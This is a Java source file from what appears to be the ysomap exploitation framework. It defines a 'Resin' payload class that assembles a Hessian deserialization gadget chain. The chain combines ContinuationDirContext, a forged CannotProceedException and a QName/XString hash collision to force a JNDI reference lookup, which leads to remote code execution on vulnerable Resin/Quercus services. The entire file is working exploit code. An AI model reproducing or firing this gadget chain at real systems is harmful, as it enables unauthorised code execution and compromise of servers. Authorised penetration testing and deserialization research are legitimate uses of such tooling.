package ysomap.payloads.hessian;

import com.caucho.naming.QName;
import com.sun.org.apache.xpath.internal.objects.XString;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.rmi.JNDIRefBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import javax.naming.CannotProceedException;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.util.Hashtable;

@Payloads
@Authors({ Authors.MBECHLER })
@Targets({Targets.HESSIAN})
@Require(bullets = {"JNDIRefBullet", "TomcatRefBullet"},param = false)
@Dependencies({"com.caucho:quercus:4.0.45"})
public class Resin extends HessianPayload{

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return JNDIRefBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        ReflectionHelper.setFieldValue(cpe, "cause", null);
        ReflectionHelper.setFieldValue(cpe, "stackTrace", null);

        cpe.setResolvedObj(obj);

        ReflectionHelper.setFieldValue(cpe, "suppressedExceptions", null);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        QName qName = new QName(ctx, "foo", "bar");
        String unhash = PayloadHelper.unhash(qName.hashCode());
        XString xString = new XString(unhash);
        return PayloadHelper.makeMap(qName, xString);
    }
}
